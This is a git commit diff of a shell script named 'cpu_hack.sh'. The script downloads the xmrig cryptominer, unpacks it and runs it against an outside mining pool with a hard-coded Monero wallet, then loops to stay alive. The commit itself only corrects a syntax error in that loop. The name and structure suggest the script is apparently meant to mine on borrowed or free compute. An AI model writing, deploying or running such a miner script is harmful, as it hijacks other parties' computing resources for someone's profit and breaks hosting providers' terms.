0db1bac286c4864fe670267431dec4e734ae8ce8
erdiyy <152510363+erdiyy@users.noreply.github.com>
2023-12-03 01:24:45 +0300

    Update cpu_hack.sh

--- cpu_hack.sh
+++ cpu_hack.sh
@@ -5,7 +5,7 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux
 tar xf xmrig-6.21.0-linux-64.tar.gz
 cd xmrig-6.21.0
 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u xmr:82UNyr6tGBH5YHc8JwvqKiUzaHtfpx2wMijaZThfG3RuMdJh15ueqKoQqCisrrkGDjLURFLcy3kNXEYDN7RjWpp16sQ5JiZ -p x --cpu 2
-while [ 1 ]: do
+while [ 1 ]; do
 sleep 3
 done
 sleep 999
